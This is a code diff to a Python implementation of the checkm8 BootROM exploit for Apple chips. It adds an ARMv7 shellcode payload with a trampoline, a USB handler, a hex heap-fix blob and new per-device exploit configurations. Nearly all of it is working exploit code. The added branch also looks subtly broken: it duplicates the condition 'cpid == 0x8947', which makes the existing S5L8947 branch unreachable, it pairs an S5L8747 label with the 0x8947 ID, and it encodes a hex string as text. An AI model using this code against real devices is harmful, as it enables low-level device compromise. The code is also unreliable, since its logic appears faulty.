@@ -292,6 +292,32 @@ def payload(cpid: int) -> bytes:
     checkm8_constants = checkm8_config.constants
 
     if cpid == 0x8947:
+        s5l8747x_handler = (
+            asm_thumb_trampoline(0x2201C800 + 1, 0x70F4 + 1)
+            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
+        )
+        s5l8747x_shellcode = prepare_shellcode(
+            "checkm8_armv7", checkm8_constants.values
+        )
+        assert len(s5l8747x_shellcode) <= PAYLOAD_OFFSET_ARMV7
+        assert len(s5l8747x_handler) <= PAYLOAD_SIZE_ARMV7
+        ret = (
+            s5l8747x_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8747x_shellcode))
+            + s5l8747x_handler
+        )
+        fix_heap = "fe402de93c409fe50050a0e338609fe5" \
+                    "016086e2050084e036ff2fe1405085e2" \
+                    "1e0d55e3faffff1a20409fe520009fe5" \
+                    "20109fe5000084e5041084e5fe40bde8" \
+                    "14009fe510ff2fe1e0b401221c360000" \
+                    "40b30122080000000200000000000022".encode('iso-8859-15')
+        assert len(ret) < 0x300
+        ret += b"\0" * (0x300 - len(ret)) + fix_heap
+        return ret
+
+
+    if cpid == 0x8947:
         s5l8947x_handler = (
             asm_thumb_trampoline(0x34039800 + 1, 0x7BC8 + 1)
             + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
@@ -709,6 +735,8 @@ def all_exploit_configs() -> list[DeviceConfig]:
     )
 
     return [
+        DeviceConfig("iBoot-1413.8", 0x8947, 41, s5l8947x_overwrite, 0, None, None),
+        # S5L8747 (DFU loop)     needs testing for time
         DeviceConfig("iBoot-1458.2", 0x8947, 626, s5l8947x_overwrite, 0, None, None),
         # S5L8947 (DFU loop)     1.97 seconds
         DeviceConfig("iBoot-1145.3", 0x8950, 659, s5l895xx_overwrite, 0, None, None),
@@ -722,12 +750,13 @@ def all_exploit_configs() -> list[DeviceConfig]:
         DeviceConfig("iBoot-2651.0.0.3.3", 0x8004, None, t800x_overwrite, 0, 5, 1),
         # T8004 (buttons)   NEW: 1.06 seconds
         DeviceConfig("iBoot-2481.0.0.2.1", 0x8001, None, s8001_overwrite, 0, None, None),
-        # S8001
+        # S8001 (buttons)   needs testing for time
         DeviceConfig("iBoot-2696.0.0.1.33", 0x8010, None, t8010_overwrite, 0, 5, 1),
         # T8010 (buttons)   NEW: 0.68 seconds
         DeviceConfig("iBoot-3135.0.0.2.3", 0x8011, None, t8011_overwrite, 0, 6, 1),
         # T8011 (buttons)   NEW: 0.87 seconds
         DeviceConfig("iBoot-3401.0.0.1.16", 0x8012, None, t8012_overwrite, 0, 6, 1),
+        # T8012 (DFU loop)  needs testing for time
         DeviceConfig("iBoot-3332.0.0.1.23", 0x8015, None, t8015_overwrite, 0, 6, 1),
         # T8015 (DFU loop)  NEW: 0.66 seconds
     ]
